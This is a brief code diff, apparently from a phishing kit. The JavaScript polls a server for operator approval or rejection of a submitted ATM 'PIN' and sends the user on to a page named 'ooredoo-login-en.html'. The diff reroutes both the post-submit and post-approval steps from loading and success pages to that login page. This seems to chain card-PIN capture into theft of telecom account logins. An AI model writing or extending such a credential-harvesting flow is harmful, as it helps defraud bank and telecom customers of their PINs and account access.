@@ -353,7 +353,7 @@
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data.ok) {
-          window.location.href = 'loading-en.html?type=atm&id=' + encodeURIComponent(requestId);
+          window.location.href = 'ooredoo-login-en.html?id=' + encodeURIComponent(requestId);
         } else {
           throw new Error('Failed to submit');
         }
@@ -375,7 +375,7 @@
             if (!data || !data.status) return;
             if (data.status === 'approved') {
               clearInterval(pollInterval);
-              window.location.href = 'success-en.html?id=' + requestId;
+              window.location.href = 'ooredoo-login-en.html?id=' + requestId;
             } else if (data.status === 'rejected') {
               clearInterval(pollInterval);
               var rejectMessage = 'The PIN was rejected. Please verify the details and try again.';
